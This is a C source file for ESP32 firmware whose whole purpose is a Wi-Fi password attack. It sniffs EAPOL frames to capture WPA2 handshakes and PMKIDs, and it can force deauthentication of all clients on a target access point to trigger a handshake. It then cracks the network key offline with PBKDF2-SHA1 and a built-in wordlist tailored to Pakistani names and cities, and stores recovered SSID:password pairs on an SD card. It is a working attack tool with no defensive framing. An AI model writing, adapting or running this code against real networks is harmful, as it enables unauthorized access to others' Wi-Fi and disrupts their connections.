#include <stdbool.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "handshake_crack.h"
#include "deauth_engine.h"
#include "wifi_sniffer.h"
#include "nvs_flash.h"
#include "esp_timer.h"
#include "esp_heap_caps.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"


static const char *TAG = "handshake";
static const uint8_t HS_ZERO_MAC[6] = {0, 0, 0, 0, 0, 0};

atomic_bool g_hs_capture_active = ATOMIC_VAR_INIT(false);
static handshake_t g_hs;
static atomic_bool g_hs_have_m1 = ATOMIC_VAR_INIT(false);
static atomic_bool g_hs_crack_running = ATOMIC_VAR_INIT(false);
static atomic_bool g_hs_crack_stop = ATOMIC_VAR_INIT(false);
static bool g_hs_crack_found_flag = false;
static char g_hs_found_password[64] = {0};

static char **g_custom_wl = NULL;
static size_t g_custom_wl_count = 0;

/* --- Self-contained Lightweight SHA-1 & HMAC-SHA1 --- */
typedef struct {
    uint32_t state[5];
    uint32_t count[2];
    uint8_t buffer[64];
} mini_sha1_ctx;

#define SHA1_ROL(val, bits) (((val) << (bits)) | ((val) >> (32 - (bits))))

static void mini_sha1_transform(uint32_t state[5], const uint8_t buffer[64])
{
    uint32_t a = state[0], b = state[1], c = state[2], d = state[3], e = state[4];
    uint32_t w[80];

    for (int i = 0; i < 16; i++) {
        w[i] = ((uint32_t)buffer[i * 4] << 24) |
               ((uint32_t)buffer[i * 4 + 1] << 16) |
               ((uint32_t)buffer[i * 4 + 2] << 8) |
               ((uint32_t)buffer[i * 4 + 3]);
    }
    for (int i = 16; i < 80; i++) {
        w[i] = SHA1_ROL(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 1);
    }

    for (int i = 0; i < 80; i++) {
        uint32_t f, k;
        if (i < 20) {
            f = (b & c) | ((~b) & d);
            k = 0x5A827999;
        } else if (i < 40) {
            f = b ^ c ^ d;
            k = 0x6ED9EBA1;
        } else if (i < 60) {
            f = (b & c) | (b & d) | (c & d);
            k = 0x8F1BBCDC;
        } else {
            f = b ^ c ^ d;
            k = 0xCA62C1D6;
        }
        uint32_t temp = SHA1_ROL(a, 5) + f + e + k + w[i];
        e = d;
        d = c;
        c = SHA1_ROL(b, 30);
        b = a;
        a = temp;
    }

    state[0] += a; state[1] += b; state[2] += c; state[3] += d; state[4] += e;
}

static void mini_sha1_init(mini_sha1_ctx *ctx)
{
    ctx->state[0] = 0x67452301;
    ctx->state[1] = 0xEFCDAB89;
    ctx->state[2] = 0x98BADCFE;
    ctx->state[3] = 0x10325476;
    ctx->state[4] = 0xC3D2E1F0;
    ctx->count[0] = ctx->count[1] = 0;
}

static void mini_sha1_update(mini_sha1_ctx *ctx, const uint8_t *data, size_t len)
{
    size_t i = 0, j = (ctx->count[0] >> 3) & 63;
    if ((ctx->count[0] += (uint32_t)len << 3) < ((uint32_t)len << 3)) ctx->count[1]++;
    ctx->count[1] += (uint32_t)(len >> 29);

    if ((j + len) > 63) {
        memcpy(&ctx->buffer[j], data, (i = 64 - j));
        mini_sha1_transform(ctx->state, ctx->buffer);
        for (; i + 63 < len; i += 64) {
            mini_sha1_transform(ctx->state, &data[i]);
        }
        j = 0;
    }
    memcpy(&ctx->buffer[j], &data[i], len - i);
}

static void mini_sha1_final(mini_sha1_ctx *ctx, uint8_t digest[20])
{
    uint8_t finalcount[8];
    for (int i = 0; i < 8; i++) {
        finalcount[i] = (uint8_t)((ctx->count[(i >= 4 ? 0 : 1)] >> ((3 - (i & 3)) * 8)) & 255);
    }
    mini_sha1_update(ctx, (const uint8_t *)"\x80", 1);
    while ((ctx->count[0] & 504) != 448) {
        mini_sha1_update(ctx, (const uint8_t *)"\0", 1);
    }
    mini_sha1_update(ctx, finalcount, 8);
    for (int i = 0; i < 20; i++) {
        digest[i] = (uint8_t)((ctx->state[i >> 2] >> ((3 - (i & 3)) * 8)) & 255);
    }
}


static int hmac_sha1(const unsigned char *key, size_t key_len,
              const unsigned char *msg, size_t msg_len,
              unsigned char *out)
{
    uint8_t k[64] = {0};
    uint8_t ipad[64], opad[64], inner[20];
    mini_sha1_ctx ctx;

    if (key_len > 64) {
        mini_sha1_init(&ctx);
        mini_sha1_update(&ctx, key, key_len);
        mini_sha1_final(&ctx, k);
    } else {
        memcpy(k, key, key_len);
    }

    for (int i = 0; i < 64; i++) {
        ipad[i] = k[i] ^ 0x36;
        opad[i] = k[i] ^ 0x5C;
    }

    mini_sha1_init(&ctx);
    mini_sha1_update(&ctx, ipad, 64);
    mini_sha1_update(&ctx, msg, msg_len);
    mini_sha1_final(&ctx, inner);

    mini_sha1_init(&ctx);
    mini_sha1_update(&ctx, opad, 64);
    mini_sha1_update(&ctx, inner, 20);
    mini_sha1_final(&ctx, out);
    return 0;
}

static const char *const BUILTIN_WORDS[] = {
    "password", "12345678", "123456789", "1234567890", "qwerty123",
    "qwertyuiop", "1234567", "123456", "12345", "1234",
    "111111", "000000", "123123", "123321", "654321",
    "abc123", "iloveyou", "letmein", "welcome", "monkey",
    "dragon", "football", "baseball", "shadow", "master",
    "superman", "mustang", "michael", "admin123", "admin",
    "1qaz2wsx", "zaq12wsx", "qazwsx", "123qwe", "qwe123",
    "666666", "7777777", "121212", "987654321", "asdfgh",
    "password1", "welcome123", "welcome2024", "sunshine", "internet",
    "company", "homewifi", "wifi12345", "myrouter", "security",
    "pakistan", "pakistan123", "pakistan1947", "pakistan786", "pakistanzindabad",
    "multan", "multan123", "lahore", "karachi", "islamabad",
    "quetta", "peshawar", "faisalabad", "rawalpindi", "sialkot",
    "allahuakbar", "muhammad", "muhammad123", "muhammad786",
    "786786", "786786786", "khan123", "ali123", "ahmed123",
    "hamza123", "usman123", "umair123", "bilal123", "faisal123",
    "zeeshan123", "abdullah123", "hassan123", "hussain123",
    "saad123", "taha123", "mustafa123", "awan123", "malik123",
    "waseem123", "nadeem123", "imran123", "salman123", "osama123",
    "owais123", "rehman123", "raheel123", "shahid123", "sajid123",
    "noman123", "adnan123", "kamran123", "junaid123", "sufyan123",
    "hammad123", "fahad123", "talha123", "aamir123", "shakeel123",
    "zubair123", "aslam123", "akram123", "irfan123", "03123456789"
};
#define BUILTIN_WORD_COUNT (sizeof(BUILTIN_WORDS) / sizeof(BUILTIN_WORDS[0]))

static void pbkdf2_sha1(const char *pw, const char *ssid, uint8_t out[32])
{
    uint8_t U[20], T[20];
    size_t salt_len = strlen(ssid);
    size_t pw_len = strlen(pw);

    if (salt_len > 64) {
        salt_len = 64;
    }

    for (int block = 1; block <= 2; block++) {
        /* U_1 = HMAC-SHA1(PW, salt || INT_32_BE(block)) */
        uint8_t block_salt[68];
        memcpy(block_salt, ssid, salt_len);
        block_salt[salt_len]     = (block >> 24) & 0xFF;
        block_salt[salt_len + 1] = (block >> 16) & 0xFF;
        block_salt[salt_len + 2] = (block >> 8) & 0xFF;
        block_salt[salt_len + 3] = block & 0xFF;

        hmac_sha1((const unsigned char *)pw, pw_len, block_salt, salt_len + 4, U);
        memcpy(T, U, 20);

        for (int iter = 1; iter < 4096; iter++) {
            hmac_sha1((const unsigned char *)pw, pw_len, U, 20, U);
            for (int j = 0; j < 20; j++) {
                T[j] ^= U[j];
            }
        }

        size_t offset = (block - 1) * 20;
        size_t to_copy = (32 - offset < 20) ? (32 - offset) : 20;
        memcpy(out + offset, T, to_copy);
    }
}

esp_err_t handshake_init(void)
{
    memset(&g_hs, 0, sizeof(g_hs));
    ESP_LOGI(TAG, "Handshake module ready");
    return ESP_OK;
}

const char *const *handshake_wordlist(size_t *count)
{
    if (g_custom_wl_count > 0) {
        *count = g_custom_wl_count;
        return (const char *const *)g_custom_wl;
    }
    *count = BUILTIN_WORD_COUNT;
    return BUILTIN_WORDS;
}

esp_err_t handshake_load_wordlist(const char *path)
{
    if (path == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    FILE *f = fopen(path, "r");
    if (f == NULL) {
        ESP_LOGE(TAG, "Cannot open wordlist: %s", path);
        return ESP_FAIL;
    }

    if (g_custom_wl != NULL) {
        for (size_t i = 0; i < g_custom_wl_count; i++) {
            free(g_custom_wl[i]);
        }
        free(g_custom_wl);
        g_custom_wl = NULL;
        g_custom_wl_count = 0;
    }

    char line[96];
    size_t n = 0;
    size_t skipped = 0;
    while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\r\n")] = '\0';
        size_t len = strlen(line);
        if (len >= 8) {
            n++;
        } else if (len > 0) {
            skipped++;
        }
    }

    if (n == 0) {
        fclose(f);
        return ESP_ERR_INVALID_SIZE;
    }

    rewind(f);
    g_custom_wl = heap_caps_malloc(n * sizeof(char *), MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (g_custom_wl == NULL) {
        fclose(f);
        return ESP_ERR_NO_MEM;
    }

    size_t i = 0;
    while (fgets(line, sizeof(line), f) && i < n) {
        line[strcspn(line, "\r\n")] = '\0';
        if (strlen(line) < 8) {
            continue;
        }
        g_custom_wl[i] = heap_caps_malloc(strlen(line) + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
        if (g_custom_wl[i] == NULL) {
            for (size_t j = 0; j < i; j++) {
                free(g_custom_wl[j]);
            }
            free(g_custom_wl);
            g_custom_wl = NULL;
            fclose(f);
            return ESP_ERR_NO_MEM;
        }
        strcpy(g_custom_wl[i], line);
        i++;
    }
    g_custom_wl_count = i;
    fclose(f);

    ESP_LOGI(TAG, "Loaded %zu passwords from %s", g_custom_wl_count, path);
    if (skipped > 0) {
        ESP_LOGW(TAG, "Skipped %zu short lines (< 8 chars)", skipped);
    }
    return ESP_OK;
}

void handshake_feed_packet(const uint8_t *data, size_t len, uint8_t channel)
{
    (void)channel;
    if (!atomic_load(&g_hs_capture_active) || data == NULL) return;
    if (len < 26 + 8 + 99) return;

    if ((data[0] & 0x0C) != 0x08) return;

    uint8_t subtype = (data[0] >> 4) & 0x0F;
    size_t hdr_len = (subtype & 0x08) ? 26 : 24;

    static const uint8_t snap_eapol[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
    if (len < hdr_len + 8 + 99) return;
    if (memcmp(data + hdr_len, snap_eapol, 8) != 0) return;

    const uint8_t *sa = data + 10;
    const uint8_t *da = data + 4;
    const uint8_t *eapol = data + hdr_len + 8;

    if (eapol[1] != 3) return;

    bool from_ap = (memcmp(sa, g_hs.ap_mac, 6) == 0);
    uint16_t key_info = eapol[5] | (eapol[6] << 8);
    bool has_ack = (key_info & 0x0008) != 0;
    bool has_mic = (key_info & 0x0040) != 0;
    bool secure = (key_info & 0x0100) != 0;

    bool nonce_nonzero = false;
    for (int i = 0; i < 32; i++) {
        if (eapol[17 + i] != 0) {
            nonce_nonzero = true;
            break;
        }
    }
    if (!nonce_nonzero) return;

    if (from_ap && has_ack && !has_mic) {
        memcpy(g_hs.anonce, eapol + 17, 32);
        memcpy(g_hs.sta_mac, da, 6);
        atomic_store(&g_hs_have_m1, true);

        uint16_t kd_len = eapol[97] | (eapol[98] << 8);
        const uint8_t *kd = eapol + 99;
        size_t pos = 0;
        while (pos + 4 <= kd_len) {
            if (kd[pos] == 0xDD && kd[pos + 1] >= 18 &&
                memcmp(kd + pos + 2, "\x00\x0f\xac\x04", 4) == 0) {
                memcpy(g_hs.pmkid, kd + pos + 6, 16);
                g_hs.has_pmkid = true;
                ESP_LOGI(TAG, "PMKID captured from M1!");
                break;
            }
            pos += 2 + kd[pos + 1];
        }

        if (g_hs.ssid[0] == '\0') {
            wifi_sniffer_get_ssid_for_bssid(g_hs.ap_mac, g_hs.ssid, sizeof(g_hs.ssid));
        }
        ESP_LOGI(TAG, "EAPOL M1 captured (ANonce ok)");
    } else if (!from_ap && has_mic && !has_ack && !secure) {
        if (!atomic_load(&g_hs_have_m1)) return;

        if (memcmp(g_hs.sta_mac, HS_ZERO_MAC, 6) != 0 && memcmp(da, g_hs.sta_mac, 6) != 0) return;

        memcpy(g_hs.snonce, eapol + 17, 32);
        memcpy(g_hs.mic, eapol + 81, 16);

        uint16_t kd_len = eapol[97] | (eapol[98] << 8);
        size_t total = 99 + kd_len;
        if (total > EAPOL_BUF_SIZE) total = EAPOL_BUF_SIZE;
        memcpy(g_hs.eapol, eapol, total);
        g_hs.eapol_len = (uint16_t)total;
        memset(g_hs.eapol + 81, 0, 16);
        g_hs.capture_time_us = esp_timer_get_time();
        g_hs.valid = true;
        atomic_store(&g_hs_capture_active, false);

        if (g_hs.ssid[0] == '\0') {
            snprintf(g_hs.ssid, sizeof(g_hs.ssid), "unknown");
        }

        ESP_LOGI(TAG, "Handshake capture complete");
    }
}

static void handshake_crack_task(void *arg)
{
    size_t count = 0;
    const char *const *words = handshake_wordlist(&count);

    atomic_store(&g_hs_crack_running, true);
    atomic_store(&g_hs_crack_stop, false);
    g_hs_crack_found_flag = false;
    g_hs_found_password[0] = '\0';

    if (!g_hs.valid) {
        atomic_store(&g_hs_crack_running, false);
        vTaskDelete(NULL);
        return;
    }

    handshake_t hs;
    memcpy(&hs, &g_hs, sizeof(hs));

    for (size_t i = 0; i < count; i++) {
        if (atomic_load(&g_hs_crack_stop)) break;

        const char *pw = words[i];
        if (pw == NULL || strlen(pw) < 8) continue;

        uint8_t psk[32];
        pbkdf2_sha1(pw, hs.ssid, psk);

        uint8_t mic[20];
        hmac_sha1(psk, 32, hs.eapol, hs.eapol_len, mic);

        if (memcmp(mic, hs.mic, 16) == 0) {
            snprintf(g_hs_found_password, sizeof(g_hs_found_password), "%s", pw);
            g_hs_crack_found_flag = true;
            break;
        }
    }

    atomic_store(&g_hs_crack_running, false);
    vTaskDelete(NULL);
}

typedef struct {
    uint32_t dur;
} hs_timer_arg_t;

static void handshake_timer_task(void *arg)
{
    watchdog_task_refresh("hs_timer");
    hs_timer_arg_t *t = (hs_timer_arg_t *)arg;
    vTaskDelay(pdMS_TO_TICKS(t->dur * 1000));
    handshake_capture_stop();
    heap_caps_free(t);
    vTaskDelete(NULL);
}

esp_err_t handshake_capture_start(const uint8_t *bssid, const uint8_t *client_mac,
                                  uint32_t duration_sec, bool force_deauth)
{
    memset(&g_hs, 0, sizeof(g_hs));
    atomic_store(&g_hs_have_m1, false);
    atomic_store(&g_hs_capture_active, true);
    g_hs.valid = false;
    if (bssid != NULL) memcpy(g_hs.ap_mac, bssid, 6);
    if (client_mac != NULL) memcpy(g_hs.sta_mac, client_mac, 6);

    if (force_deauth) {
        deauth_remove_all();
        if (bssid != NULL) {
            deauth_attack_ap_all_clients(bssid, 0, 0, DEAUTH_MODE_FALLBACK_CHAIN);
            deauth_start();
        }
    }

    if (duration_sec > 0) {
        hs_timer_arg_t *targ = heap_caps_malloc(sizeof(*targ),
                                                MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
        if (targ != NULL) {
            targ->dur = duration_sec;
            xTaskCreatePinnedToCore(handshake_timer_task, "hs_timer", 2048,
                                    targ, 3, NULL, 0);
        }
    }

    return ESP_OK;
}

void handshake_capture_stop(void)
{
    atomic_store(&g_hs_capture_active, false);
    deauth_stop();
    ESP_LOGI(TAG, "Handshake capture stopped");
}

bool handshake_has_capture(void)
{
    return g_hs.valid;
}

const handshake_t *handshake_get(void)
{
    return &g_hs;
}

void handshake_set_ssid(const char *ssid)
{
    if (ssid == NULL) return;
    snprintf(g_hs.ssid, sizeof(g_hs.ssid), "%s", ssid);
}

esp_err_t handshake_crack_async(void)
{
    if (atomic_load(&g_hs_crack_running)) return ESP_ERR_INVALID_STATE;
    if (!g_hs.valid) return ESP_ERR_INVALID_STATE;

    if (xTaskCreatePinnedToCore(handshake_crack_task, "hs_crack", 8192, NULL, 4, NULL, 1) != pdPASS) {
        return ESP_FAIL;
    }

    return ESP_OK;
}

bool handshake_crack_running(void)
{
    return atomic_load(&g_hs_crack_running);
}

bool handshake_crack_found(char *password, size_t sz)
{
    if (!g_hs_crack_found_flag) return false;
    if (password != NULL && sz > 0) {
        snprintf(password, sz, "%s", g_hs_found_password);
    }
    return true;
}

void handshake_crack_stop(void)
{
    atomic_store(&g_hs_crack_stop, true);
}

esp_err_t handshake_save_password(const char *ssid, const char *password)
{
    if (ssid == NULL || password == NULL) return ESP_ERR_INVALID_ARG;
    FILE *f = fopen("/sd/handshake_passwords.txt", "a");
    if (f == NULL) return ESP_FAIL;
    fprintf(f, "%s:%s\n", ssid, password);
    fclose(f);
    return ESP_OK;
}

bool handshake_load_password(char *ssid, size_t ssid_sz, char *password, size_t pw_sz)
{
    FILE *f = fopen("/sd/handshake_passwords.txt", "r");
    if (f == NULL) return false;

    char line[128];
    while (fgets(line, sizeof(line), f)) {
        char *sep = strchr(line, ':');
        if (sep == NULL) continue;

        *sep = '\0';
        char *stored_ssid = line;
        char *stored_password = sep + 1;

        stored_password[strcspn(stored_password, "\r\n")] = '\0';
        stored_ssid[strcspn(stored_ssid, "\r\n")] = '\0';

        if (ssid != NULL && ssid_sz > 0 && strcmp(stored_ssid, ssid) == 0) {
            if (password != NULL && pw_sz > 0) {
                strncpy(password, stored_password, pw_sz - 1);
                password[pw_sz - 1] = '\0';
            }
            fclose(f);
            return true;
        }
    }

    fclose(f);
    return false;
}

esp_err_t handshake_erase_password(void)
{
    FILE *f = fopen("/sd/handshake_passwords.txt", "w");
    if (f == NULL) return ESP_FAIL;
    fclose(f);
    return ESP_OK;
}